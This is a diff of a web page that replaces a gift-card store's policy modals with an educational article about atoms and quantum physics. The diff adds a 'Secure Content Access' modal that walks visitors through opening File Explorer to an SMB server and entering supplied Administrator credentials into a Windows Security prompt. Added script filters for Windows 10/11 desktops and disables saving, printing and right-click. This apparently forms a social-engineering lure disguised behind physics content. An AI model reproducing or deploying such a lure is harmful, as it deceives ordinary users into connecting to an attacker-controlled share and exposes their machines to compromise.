+                            <li>The model mixed classical physics (orbits) with new quantum rules in a way that was not fully consistent. Why should electrons in stationary orbits not radiate?</li>
+                        </ul>
+                        <p class="mt-6 leading-relaxed">
+                            The puzzle of why angular momentum was quantized was later explained by Louis de Broglie in 1923. He proposed that electrons have wave-like properties, and the allowed orbits were simply those where the electron's wave could form a stable standing wave around the nucleus. This concept of wave-particle duality became a cornerstone of the modern, more complete theory of <strong class="text-yellow-300">Quantum Mechanics</strong>, which replaced Bohr's semi-classical model and provides our current, highly accurate picture of the atom.
+                        </p>
+                    </section>
+
+                    <section id="quantum-numbers" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Quantum Numbers: The Atom's Address System</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            In quantum mechanics, the state of an electron in an atom is described by a set of four quantum numbers. These numbers specify the properties of the electron's orbital and its spin. Think of them as the electron's unique address. The Principal Quantum Number (n) describes the energy level. The Azimuthal Quantum Number (l) defines the shape of the orbital (s, p, d, f). The Magnetic Quantum Number (ml) specifies the orbital's orientation in space. Finally, the Spin Quantum Number (ms) describes the intrinsic angular momentum of the electron, which can be either "spin-up" or "spin-down".
+                        </p>
+                    </section>
+
+                    <section id="orbitals" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Electron Orbitals: Probability Clouds</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Unlike the neat circular paths of the Bohr model, quantum mechanics describes electron locations in terms of orbitals, which are three-dimensional regions of space where there is a high probability of finding an electron. These are not physical boundaries but probability clouds. The shape of these orbitals depends on the azimuthal quantum number. 's' orbitals are spherical, 'p' orbitals are dumbbell-shaped and oriented along the x, y, and z axes, and 'd' and 'f' orbitals have more complex shapes. The arrangement of electrons within these orbitals, known as electron configuration, dictates an element's chemical behavior.
+                        </p>
+                    </section>
+                    
+                    <section id="wave-particle-duality" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Wave-Particle Duality</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            One of the most profound concepts in quantum mechanics is that particles like electrons, protons, and even photons can exhibit both wave-like and particle-like properties. This was first proposed by Louis de Broglie. In some experiments, an electron behaves like a discrete particle, having a specific position and momentum. In others, like the double-slit experiment, it behaves like a wave, creating an interference pattern. This duality is fundamental to the nature of reality at the quantum scale and explains why electrons exist in quantized energy levels, as their wave patterns must fit perfectly within the confines of the atom.
+                        </p>
+                    </section>
+
+                    <section id="uncertainty-principle" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Heisenberg's Uncertainty Principle</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Werner Heisenberg formulated a core principle of quantum mechanics in 1927. It states that there is a fundamental limit to the precision with which certain pairs of physical properties of a particle, known as complementary variables, can be known simultaneously. The most common pair is position and momentum. The more precisely you measure the position of a particle like an electron, the less precisely you can know its momentum, and vice versa. This isn't due to limitations in our instruments; it's an inherent property of the quantum world. This principle invalidates the idea of electrons having definite orbits, as that would require knowing both their position and momentum precisely at all times.
+                        </p>
+                    </section>
+                    
+                    <section id="chemical-bonding" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Chemical Bonding: Atoms Joining Forces</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Atoms rarely exist in isolation. They interact with other atoms to form molecules and compounds through chemical bonds. This process is driven by the desire of atoms to achieve a more stable electron configuration, typically by filling their outermost electron shell. In an <strong class="text-yellow-300">ionic bond</strong>, one atom transfers electrons to another, creating charged ions that attract each other. In a <strong class="text-yellow-300">covalent bond</strong>, atoms share electrons to achieve stability. The type of bond formed depends on the elements' electronegativity, and these interactions are the foundation of all chemistry.
+                        </p>
+                    </section>
+
+                    <section id="radioactivity" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Radioactivity: Unstable Nuclei</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Not all atomic nuclei are stable. Some isotopes have an unstable combination of protons and neutrons, causing them to spontaneously decay and release energy in the form of radiation. This process is called radioactivity. There are three main types of decay: <strong class="text-yellow-300">Alpha decay</strong>, where a nucleus emits an alpha particle (a helium nucleus); <strong class="text-yellow-300">Beta decay</strong>, where a neutron turns into a proton, emitting an electron; and <strong class="text-yellow-300">Gamma decay</strong>, where an excited nucleus releases energy as high-energy photons (gamma rays). This natural process is harnessed in many technologies, from medical imaging to generating nuclear power.
+                        </p>
+                    </section>
+
+                    <section id="fission" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Nuclear Fission: Splitting the Atom</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Nuclear fission is a process where the nucleus of a heavy atom, such as Uranium-235, is split into two or more lighter nuclei. This process is typically initiated by bombarding the nucleus with a neutron. The splitting releases an immense amount of energy, along with additional neutrons. These new neutrons can then trigger fission in other nearby nuclei, leading to a self-sustaining chain reaction. This is the principle behind nuclear power reactors, which control the chain reaction to generate electricity, and atomic bombs, where the chain reaction is allowed to proceed uncontrollably, releasing energy explosively.
+                        </p>
+                    </section>
+
+                    <section id="fusion" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Nuclear Fusion: Powering the Stars</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Nuclear fusion is the opposite of fission. It's a process where two light atomic nuclei combine, or fuse, to form a single heavier nucleus. This process releases even more energy than fission. Fusion is the engine that powers the Sun and all other stars, where immense gravitational pressure and extreme temperatures force hydrogen nuclei to fuse into helium. Scientists on Earth are working to replicate this process in reactors like tokamaks to create a source of clean, safe, and virtually limitless energy. However, achieving and sustaining the required conditions of over 100 million degrees Celsius is an immense technological challenge.
+                        </p>
+                    </section>
+                    
+                    <section id="half-life" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Half-Life: The Pace of Radioactive Decay</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Radioactive decay is a random process at the level of a single atom, but for a large collection of atoms, the rate of decay is predictable. The half-life of a radioactive isotope is the time it takes for half of the atoms in a sample to decay. Half-lives can range from fractions of a second for highly unstable isotopes to billions of years for isotopes like Uranium-238. This predictable decay rate is the basis for radiometric dating techniques, such as carbon-14 dating, which allow scientists to determine the age of ancient artifacts, fossils, and geological formations by measuring the ratio of remaining parent isotopes to daughter isotopes.
+                        </p>
+                    </section>
+                    
+                    <section id="fundamental-forces" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">The Four Fundamental Forces</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            All interactions in the universe are governed by four fundamental forces. The <strong class="text-red-300">Strong Nuclear Force</strong> is the most powerful, holding protons and neutrons together in the nucleus. The <strong class="text-red-300">Electromagnetic Force</strong> acts between charged particles and is responsible for holding atoms and molecules together. The <strong class="text-red-300">Weak Nuclear Force</strong> is responsible for certain types of radioactive decay, like beta decay. Finally, <strong class="text-red-300">Gravity</strong> is the weakest force but has an infinite range, governing the large-scale structure of the universe. Understanding these forces is crucial to understanding the behavior of matter from the subatomic to the cosmic scale.
+                        </p>
+                    </section>
+
+                    <section id="standard-model" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">The Standard Model of Particle Physics</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            The Standard Model is the most successful theory in particle physics, describing the fundamental particles and forces that make up the universe (excluding gravity). It classifies particles into two main groups: quarks (which make up protons and neutrons) and leptons (which include electrons and neutrinos). It also includes the force-carrying particles, called bosons, such as photons for electromagnetism and gluons for the strong force. The discovery of the Higgs boson in 2012 at the Large Hadron Collider was a major triumph for the Standard Model, as it explained how other fundamental particles acquire mass.
+                        </p>
+                    </section>
+
+                    <section id="antimatter" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Antimatter: The Mirror Image</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            For every fundamental particle of matter, there exists a corresponding antiparticle with the same mass but opposite charge and other quantum properties. For example, the antiparticle of the negatively charged electron is the positively charged positron. When a particle and its antiparticle meet, they annihilate each other in a burst of pure energy, typically in the form of gamma rays. One of the greatest mysteries in physics is why the universe is made almost entirely of matter, with very little antimatter. Understanding this asymmetry is a major goal of modern particle physics research.
+                        </p>
+                    </section>
+
+                    <section id="quantum-tunneling" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Quantum Tunneling: Breaching Barriers</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Quantum tunneling is a bizarre phenomenon where a particle can pass through a potential energy barrier that it classically shouldn't be able to overcome. In classical physics, if you don't have enough energy to get over a hill, you're stuck. But in the quantum world, thanks to the wave-like nature of particles, there is a non-zero probability that the particle can simply "tunnel" through the barrier and appear on the other side. This effect, though counterintuitive, is essential for many processes, including nuclear fusion in the sun, the operation of certain electronic devices like tunnel diodes, and scanning tunneling microscopes.
+                        </p>
+                    </section>
+                    
+                    <section id="entanglement" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Quantum Entanglement: Spooky Action at a Distance</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Quantum entanglement is a phenomenon where two or more quantum particles become linked in such a way that their fates are intertwined, no matter how far apart they are. If you measure a property (like spin) of one entangled particle, you instantly know the corresponding property of the other particle, faster than the speed of light. Albert Einstein famously called this "spooky action at a distance." This non-local connection is a fundamental aspect of quantum mechanics and is a key resource being explored for new technologies like quantum computing and secure quantum communication.
+                        </p>
+                    </section>
+                    
+                    <section id="superposition" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Superposition: Multiple States at Once</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Superposition is the principle that a quantum system, like an electron, can exist in multiple states at the same time. For example, an electron can be in a superposition of both "spin-up" and "spin-down" states simultaneously. It is only when a measurement is made that the system "collapses" into one of the definite states. This concept is famously illustrated by the thought experiment of Schrödinger's cat, which is hypothetically both alive and dead until its box is opened. Superposition is not just a theoretical curiosity; it is the basis for the power of quantum computers, which use qubits that can represent both 0 and 1 at the same time.
+                        </p>
+                    </section>
+
+                    <section id="atomic-clocks" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Atomic Clocks: The Ultimate Timekeepers</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Atomic clocks are the most accurate timekeeping devices in the world. They work by using the incredibly consistent and predictable frequency of the electromagnetic radiation emitted or absorbed by an atom during an electron's transition between two specific energy levels. The "tick" of an atomic clock is the frequency of these quantum leaps, typically using atoms like caesium or strontium. The precision of these clocks is astounding; the best atomic clocks would not lose or gain a single second in over 15 billion years, longer than the current age of the universe. They are essential for technologies like the Global Positioning System (GPS), internet synchronization, and scientific research.
+                        </p>
+                    </section>
+                    
+                    <section id="spectroscopy" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Spectroscopy: Decoding Light from Atoms</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Spectroscopy is the study of the interaction between matter and electromagnetic radiation. By analyzing the light (or spectrum) that an object emits or absorbs, scientists can deduce a vast amount of information about it. In astronomy, spectroscopy is indispensable. By analyzing the spectrum of light from a distant star or galaxy, astronomers can determine its chemical composition, temperature, density, and even its motion towards or away from us (via the Doppler effect). This technique allows us to understand the chemistry of celestial objects that are light-years away without ever visiting them, revealing the atomic makeup of the cosmos.
+                        </p>
+                    </section>
+                    
+                    <section id="particle-accelerators" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Particle Accelerators: Probing the Atom's Depths</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Particle accelerators are massive machines that use powerful electromagnetic fields to accelerate subatomic particles to nearly the speed of light. These high-energy particles are then smashed into a target or into each other. The debris from these collisions is analyzed by complex detectors, allowing physicists to study the fundamental particles and forces of nature. The Large Hadron Collider (LHC) at CERN is the world's largest and most powerful particle accelerator. These experiments recreate the conditions of the early universe, allowing us to discover new particles like the Higgs boson and test the limits of the Standard Model.
+                        </p>
+                    </section>
+                    
+                    <section id="applications" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Atoms in Action: Modern Applications</h2>
+                        <p class="text-lg mb-6 leading-relaxed">
+                            Our understanding of the atom is not just theoretical; it is the bedrock of modern technology and science.
+                        </p>
+                        <div class="space-y-4">
+                            <p><strong class="text-green-400">Medicine:</strong> Radioactive isotopes are used in PET scans to diagnose diseases, while the principles of nuclear magnetic resonance (based on atomic nuclei) are the foundation for MRI scans.</p>
+                            <p><strong class="text-green-400">Energy:</strong> Nuclear power plants generate vast amounts of electricity by splitting heavy atoms like uranium (fission). Research into fusion, the process that powers the sun, aims to replicate this atomic process on Earth for clean energy.</p>
+                            <p><strong class="text-green-400">Electronics:</strong> The entire digital world is built on understanding the electronic properties of materials like silicon. By manipulating atoms to create semiconductors, we build transistors, the fundamental components of every computer chip.</p>
+                            <p><strong class="text-green-400">Materials Science:</strong> By arranging atoms in new ways, scientists create advanced materials with unique properties, from super-strong carbon fiber to lightweight alloys used in aerospace.</p>
+                        </div>
+                    </section>
+                    
+                </main>
+
+                <footer class="text-center py-8 mt-16 text-gray-400">
+                    <p>&copy; 2025 College Educational Department. All rights reserved.</p>
+                </footer>
+
+            </div>
         </div>
     </div>
 
-    <!-- Modals -->
-    <div id="contact-modal" class="fixed inset-0 z-[60] flex items-center justify-center bg-black bg-opacity-50 hidden p-4">
-        <div class="glass-modal rounded-2xl p-8 max-w-sm w-full relative">
-            <button class="modal-close-button absolute top-4 right-4 text-gray-600 hover:text-black text-xl">
-                <i class="fas fa-times"></i>
-            </button>
-            <h2 class="text-2xl font-bold text-gray-800 mb-4">Contact Us</h2>
-            <p class="text-gray-600 mb-4">For any questions or support, please reach out to us.</p>
-            <div>
-                <p class="font-semibold text-gray-800">Support Email:</p>
-                <a href="mailto:support@sainfoxiya.com" class="text-blue-600 hover:underline">support@sainfoxiya.com</a>
+    <!-- PDF Download Modal -->
+    <div id="pdf-modal" class="fixed inset-0 bg-black bg-opacity-90 z-50 hidden items-center justify-center p-4">
+        <div class="bg-gray-900 border border-cyan-500 rounded-lg shadow-2xl max-w-lg w-full p-6 relative transition-all duration-300 transform scale-95 opacity-0">
+            <!-- Close Button -->
+            <button id="close-modal-btn" class="absolute top-3 right-4 text-gray-400 hover:text-white text-3xl font-bold">&times;</button>
+            
+            <!-- Step 1: Initial Instructions -->
+            <div id="modal-step-1">
+                <h3 class="text-2xl font-bold text-cyan-400 mb-4">Secure Content Access</h3>
+                <p class="text-gray-300 mb-6">Due to security reasons, the content is not directly accessible. Please follow the instructions to access the resources via our secure SMB server.</p>
+                <button id="open-explorer-btn" class="w-full bg-green-500 hover:bg-green-400 text-black font-bold py-3 px-6 rounded-lg transition-colors duration-300">
+                    Click to Open File Explorer
+                </button>
+            </div>
+
+            <!-- Step 2: Loading Simulation -->
+            <div id="modal-step-2" class="hidden text-center">
+                <h3 class="text-2xl font-bold text-yellow-400 mb-4">Generating Secure Connection...</h3>
+                <div class="flex justify-center items-center mb-4">
+                    <div class="loader"></div>
+                </div>
+                <p class="text-gray-300">Wait while we connect you to the server and generate credentials for access. <span id="countdown-timer" class="font-bold text-xl text-yellow-300">20</span>s</p>
+            </div>
+
+            <!-- Step 3: Credential Display -->
+            <div id="modal-step-3" class="hidden">
+                <h3 class="text-2xl font-bold text-cyan-400 mb-4">Your Credentials</h3>
+                <p class="text-gray-300 mb-4">A "Windows Security" prompt should have appeared. Please enter the following credentials:</p>
+                <div class="bg-gray-800 border border-gray-600 rounded-md p-4 text-left space-y-2">
+                    <p><strong>Username:</strong> <span class="font-mono text-green-400">Administrator</span></p>
+                    <p><strong>Password:</strong> <span class="font-mono text-green-400">.dK2lZ@&XTvFUy$7R&LLdt8WNXpNz.IV</span></p>
+                </div>
+                <p class="text-xs text-gray-500 mt-2">If you don't see the prompt, check behind your browser window.</p>
+                <button id="proceed-btn" class="w-full mt-6 bg-cyan-500 hover:bg-cyan-400 text-black font-bold py-3 px-6 rounded-lg transition-colors duration-300">I Have Entered The Credentials</button>
+            </div>
+
+            <!-- Step 4: Success Message -->
+            <div id="modal-step-4" class="hidden text-center">
+                <h3 class="text-2xl font-bold text-green-400 mb-4">Wow! Access Granted!</h3>
+                <p class="text-gray-300">You have successfully accessed the resources. Your download link is ready.</p>
+                 <a id="final-download-link" href="leph204.pdf" download="Atom_Information.pdf" class="inline-block mt-6 bg-green-600 hover:bg-green-500 text-white font-bold py-3 px-8 rounded-lg transition-colors duration-300">Download Now</a>
             </div>
         </div>
     </div>
 
-    <div id="refund-modal" class="fixed inset-0 z-[60] flex items-center justify-center bg-black bg-opacity-50 hidden p-4">
-        <div class="glass-modal rounded-2xl p-8 max-w-2xl w-full relative text-gray-800">
-            <button class="modal-close-button absolute top-4 right-4 text-gray-600 hover:text-black text-xl">
-                <i class="fas fa-times"></i>
-            </button>
-            <h2 class="text-2xl font-bold mb-4">Refund & Exchange Policy</h2>
-            <div class="text-sm text-gray-600 space-y-3 max-h-[60vh] overflow-y-auto pr-2">
-                <p class="font-semibold">Last Updated: July 09, 2025</p>
-                <p>Thank you for your purchase from Sainfoxiya Ltd. As our products are digital in nature, please review our policy on refunds and exchanges below.</p>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">1. General Policy</h3>
-                    <ul class="list-disc list-inside space-y-1">
-                        <li><span class="font-semibold">All Sales Are Final:</span> Once a digital gift card is delivered to you via email or any other electronic means, the sale is considered final. It cannot be returned, refunded, or exchanged.</li>
-                        <li><span class="font-semibold">No Refunds:</span> We do not offer refunds for our digital products. Please carefully review your order before making a purchase.</li>
-                        <li><span class="font-semibold">No Exchanges:</span> A purchased gift card cannot be exchanged for a different brand, value, or type of gift card.</li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">2. Exceptions for Technical Issues</h3>
-                    <p>We understand that technical issues may occur. We will provide assistance in the following cases:</p>
-                    <ul class="list-disc list-inside space-y-1 mt-2">
-                        <li><span class="font-semibold">Non-Functional Code:</span> If the gift card code you received is not working or is deemed invalid, please contact our customer support team immediately.</li>
-                        <li><span class="font-semibold">Verification Process:</span> In such cases, we will investigate the issue with our team, which may involve coordinating with the brand partner. This verification process may take some time.</li>
-                        <li><span class="font-semibold">Resolution:</span> If our investigation confirms that the gift card was faulty, we will issue a new, functional gift card code of the same value and brand. Cash refunds will not be provided under any circumstances.</li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">3. How to Contact Support</h3>
-                    <p>If you experience an issue with your gift card, please email our customer support team at <a href="mailto:support@sainfoxiya.com" class="text-blue-600 hover:underline">support@sainfoxiya.com</a> with your order details.</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="privacy-policy-modal" class="fixed inset-0 z-[60] flex items-center justify-center bg-black bg-opacity-50 hidden p-4">
-        <div class="glass-modal rounded-2xl p-8 max-w-2xl w-full relative text-gray-800">
-            <button class="modal-close-button absolute top-4 right-4 text-gray-600 hover:text-black text-xl">
-                <i class="fas fa-times"></i>
-            </button>
-            <h2 class="text-2xl font-bold mb-4">Privacy Policy</h2>
-            <div class="text-sm text-gray-600 space-y-3 max-h-[60vh] overflow-y-auto pr-2">
-                <p class="font-semibold">Last Updated: July 09, 2025</p>
-                <p>Your privacy is important to us. This policy explains how we collect, use, and protect your information.</p>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">1. Information We Collect</h3>
-                    <ul class="list-disc list-inside space-y-1">
-                        <li><span class="font-semibold">Personal Information:</span> When you register or make a purchase, we collect information such as your name, email address, and contact details.</li>
-                        <li><span class="font-semibold">Payment Information:</span> We use secure third-party payment gateways to process your payment details (e.g., credit card numbers). We do not store your financial information on our servers.</li>
-                        <li><span class="font-semibold">Usage Data:</span> We may collect data on how you interact with our website, such as the pages you visit.</li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">2. How We Use Your Information</h3>
-                     <ul class="list-disc list-inside space-y-1">
-                        <li>To process and deliver your orders.</li>
-                        <li>To provide you with customer support.</li>
-                        <li>To inform you about our new offers and promotions via email (you may unsubscribe at any time).</li>
-                        <li>To improve our website and services.</li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">3. Information Sharing</h3>
-                    <p>We do not sell or rent your personal information to third parties. We may share information only with:</p>
-                    <ul class="list-disc list-inside space-y-1 mt-2">
-                        <li>Payment processors to securely complete your transactions.</li>
-                        <li>Legal authorities, if required by law.</li>
-                    </ul>
-                </div>
-                 <div>
-                    <h3 class="font-bold text-lg mb-1">4. Data Security</h3>
-                    <p>We use industry-standard security measures to protect your information from unauthorized access.</p>
-                </div>
-                 <div>
-                    <h3 class="font-bold text-lg mb-1">5. Your Rights</h3>
-                    <p>You have the right to access and correct your personal information. You can do this through your account settings or by contacting us.</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="terms-modal" class="fixed inset-0 z-[60] flex items-center justify-center bg-black bg-opacity-50 hidden p-4">
-        <div class="glass-modal rounded-2xl p-8 max-w-2xl w-full relative text-gray-800">
-            <button class="modal-close-button absolute top-4 right-4 text-gray-600 hover:text-black text-xl">
-                <i class="fas fa-times"></i>
-            </button>
-            <h2 class="text-2xl font-bold mb-4">Terms & Conditions</h2>
-            <div class="text-sm text-gray-600 space-y-3 max-h-[60vh] overflow-y-auto pr-2">
-                <p class="font-semibold">Last Updated: July 09, 2025</p>
-                <p>Welcome to Sainfoxiya Ltd. By using our website, you agree to the following terms and conditions.</p>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">1. Acceptance of Terms</h3>
-                    <p>By accessing or using this website, you fully accept and agree to be bound by these Terms & Conditions, our Privacy Policy, and our Refund & Exchange Policy. If you do not agree with these terms, please do not use our website.</p>
-                </div>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">2. User Accounts</h3>
-                     <ul class="list-disc list-inside space-y-1">
-                        <li>You must provide accurate and complete information when creating an account.</li>
-                        <li>You are solely responsible for maintaining the confidentiality of your account and password.</li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">3. Purchases and Payment</h3>
-                    <ul class="list-disc list-inside space-y-1">
-                        <li>You agree to provide current, complete, and accurate purchase and account information for all purchases made.</li>
-                        <li>Prices for our digital products are subject to change without notice.</li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">4. Prohibited Activities</h3>
-                    <p>You may not use this website for any illegal or unauthorized purpose.</p>
-                </div>
-                <div>
-                    <h3 class="font-bold text-lg mb-1">5. Intellectual Property</h3>
-                    <p>All content available on this site, including but not limited to logos, text, and graphics, is the property of Sainfoxiya Ltd. or our licensors and is protected by copyright laws.</p>
-                </div>
-                 <div>
-                    <h3 class="font-bold text-lg mb-1">6. Disclaimer of Warranties</h3>
-                    <p>We do not guarantee that the website will always be secure or error-free. Your use of the website is at your own risk.</p>
-                </div>
-                 <div>
-                    <h3 class="font-bold text-lg mb-1">7. Changes to Terms</h3>
-                    <p>We reserve the right to modify these Terms & Conditions at any time. Changes will be posted on the website.</p>
-                </div>
-                 <div>
-                    <h3 class="font-bold text-lg mb-1">8. Contact Information</h3>
-                    <p>For any questions regarding these terms, please contact us at <a href="mailto:support@sainfoxiya.com" class="text-blue-600 hover:underline">support@sainfoxiya.com</a>.</p>
-                </div>
-            </div>
-        </div>
-    </div>
 
     <script>
-        // JavaScript for mobile menu toggle
-        const mobileMenuButton = document.getElementById('mobile-menu-button');
-        const mobileMenu = document.getElementById('mobile-menu');
+        // Basic Three.js setup
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('bg-canvas'), alpha: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
 
-        mobileMenuButton.addEventListener('click', () => {
-            mobileMenu.classList.toggle('hidden');
-        });
+        camera.position.z = 60; 
 
-        // Policy bar dismissal
-        const policyBar = document.getElementById('policy-bar');
-        const acceptPolicyButton = document.getElementById('accept-policy-button');
+        const atoms = [];
 
-        if (policyBar && acceptPolicyButton) {
-            acceptPolicyButton.addEventListener('click', () => {
-                policyBar.classList.add('translate-y-full');
-            });
+        // Function to create a single atom
+        function createAtom() {
+            const atomGroup = new THREE.Group();
+            const nucleus = new THREE.Mesh(
+                new THREE.SphereGeometry(1.5, 16, 16),
+                new THREE.MeshBasicMaterial({ color: 0x4dd0e1, transparent: true, opacity: 0.8 })
+            );
+            atomGroup.add(nucleus);
+
+            const electrons = [];
+            const numElectrons = 3 + Math.floor(Math.random() * 3);
+            for (let i = 0; i < numElectrons; i++) {
+                const orbitRadius = 6 + i * 3;
+                const orbitGeometry = new THREE.TorusGeometry(orbitRadius, 0.1, 8, 50);
+                const orbitMaterial = new THREE.MeshBasicMaterial({ color: 0x90a4ae, transparent: true, opacity: 0.25 });
+                const orbit = new THREE.Mesh(orbitGeometry, orbitMaterial);
+                orbit.rotation.x = Math.random() * Math.PI;
+                orbit.rotation.y = Math.random() * Math.PI;
+                atomGroup.add(orbit);
+                
+                const electron = new THREE.Mesh(
+                    new THREE.SphereGeometry(0.5, 12, 12),
+                    new THREE.MeshBasicMaterial({ color: 0x81c784 })
+                );
+                electrons.push({mesh: electron, radius: orbitRadius, speed: (Math.random() * 0.5 + 0.5) * 0.001, angle: Math.random() * 2 * Math.PI});
+                atomGroup.add(electron);
+            }
+            
+            atomGroup.position.x = (Math.random() - 0.5) * 150;
+            atomGroup.position.y = (Math.random() - 0.5) * 150;
+            atomGroup.position.z = (Math.random() - 0.5) * 150;
+            
+            atomGroup.userData.rotationSpeed = new THREE.Vector3(
+                (Math.random() - 0.5) * 0.002,
+                (Math.random() - 0.5) * 0.002,
+                (Math.random() - 0.5) * 0.002
+            );
+
+            scene.add(atomGroup);
+            atoms.push({ group: atomGroup, electrons });
         }
 
-        // Modal Handling
-        const modalTriggers = {
-            'contact-us-link': 'contact-modal',
-            'support-link-desktop': 'contact-modal',
-            'support-link-mobile': 'contact-modal',
-            'support-link-footer': 'contact-modal',
-            'refund-link': 'refund-modal',
-            'privacy-policy-link': 'privacy-policy-modal',
-            'terms-link': 'terms-modal'
-        };
+        for (let i = 0; i < 20; i++) {
+            createAtom();
+        }
 
-        Object.keys(modalTriggers).forEach(triggerId => {
-            const trigger = document.getElementById(triggerId);
-            const modal = document.getElementById(modalTriggers[triggerId]);
-
-            if (trigger && modal) {
-                trigger.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    modal.classList.remove('hidden');
+        function animate() {
+            requestAnimationFrame(animate);
+            atoms.forEach(atomData => {
+                const { group, electrons } = atomData;
+                group.rotation.x += group.userData.rotationSpeed.x;
+                group.rotation.y += group.userData.rotationSpeed.y;
+                group.rotation.z += group.userData.rotationSpeed.z;
+                electrons.forEach(electronData => {
+                    electronData.angle += electronData.speed * 5;
+                    const electron = electronData.mesh;
+                    electron.position.x = Math.cos(electronData.angle) * electronData.radius;
+                    electron.position.y = Math.sin(electronData.angle) * electronData.radius;
                 });
+            });
+            renderer.render(scene, camera);
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        animate();
+    </script>
+    <script>
+        // Security and Modal Logic
+        window.addEventListener('DOMContentLoaded', (event) => {
+            // Security Restrictions
+            const mainContainer = document.getElementById('main-container');
+            const blockerOverlay = document.getElementById('blocker-overlay');
+            const blockerTitle = document.getElementById('blocker-title');
+            const blockerMessage = document.getElementById('blocker-message');
+
+            function blockAccess(title, message) {
+                if (mainContainer) mainContainer.style.display = 'none';
+                if(document.getElementById('pdf-modal')) document.getElementById('pdf-modal').style.display = 'none';
+                blockerTitle.textContent = title;
+                blockerMessage.textContent = message;
+                blockerOverlay.style.display = 'flex';
             }
-        });
 
-        const closeButtons = document.querySelectorAll('.modal-close-button');
-        closeButtons.forEach(button => {
-            button.addEventListener('click', () => {
-                button.closest('.fixed').classList.add('hidden');
-            });
-        });
-        
-        const modals = document.querySelectorAll('.fixed.inset-0');
-        modals.forEach(modal => {
-             modal.addEventListener('click', (e) => {
-                if (e.target === modal) {
-                    modal.classList.add('hidden');
+            if (window.innerWidth < 1024) {
+                blockAccess('Mobile/Tablet Access Denied', 'Please open this website on a desktop or laptop for the full experience.');
+                return;
+            }
+
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Windows")) {
+                if (userAgent.includes("Windows NT 6.1") || userAgent.includes("Windows NT 6.2") || userAgent.includes("Windows NT 6.3")) {
+                    blockAccess('Unsupported Operating System', 'Some resources are not supported by your Windows version. The website could not load properly. Please upgrade to Windows 10 or 11.');
+                    return;
                 }
+            }
+            
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && (e.key === 'p' || e.key === 's' || e.key === 'P' || e.key === 'S')) e.preventDefault();
+            });
+
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+
+            // PDF Modal Logic
+            const downloadBtn = document.getElementById('download-btn');
